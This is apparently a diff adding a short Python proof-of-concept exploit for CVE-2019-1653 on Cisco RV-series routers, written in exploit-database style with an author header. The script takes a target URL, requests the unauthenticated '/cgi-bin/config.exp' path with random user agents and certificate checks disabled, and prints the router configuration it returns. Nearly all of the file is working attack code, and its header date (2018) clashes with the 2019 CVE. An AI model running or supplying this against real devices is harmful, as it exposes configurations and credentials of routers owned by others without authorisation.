@@ -1,0 +1,37 @@
+# Exploit Title: 6coRV Exploit
+# Date: 01-26-2018
+# Exploit Author: Harom Ramos [Horus]
+# Tested on: Cisco RV300/RV320
+# CVE : CVE-2019-1653
+
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from fake_useragent import UserAgent
+
+def random_headers():
+    return dict({'user-agent': UserAgent().random})
+
+def request(url):
+    r = requests.Session()
+    try:
+        get =  r.get(url, headers = random_headers(), timeout = 5, verify=False)#, allow_redirects=False
+        if get.status_code == 200:  
+            return get.text    
+    except requests.ConnectionError:
+        return 'Error Conecting'
+    except requests.Timeout:
+	    return 'Error Timeout'
+    except KeyboardInterrupt:
+        raise    
+    except:
+        return 0
+
+print("")        
+print("##################################################")
+print("CISCO CVE-2019-1653 POC")
+print("From H. with love")
+print("")
+
+url = raw_input("URL> EX:http://url:port/ ") 
+url = url + "/cgi-bin/config.exp"
+print(request(url))
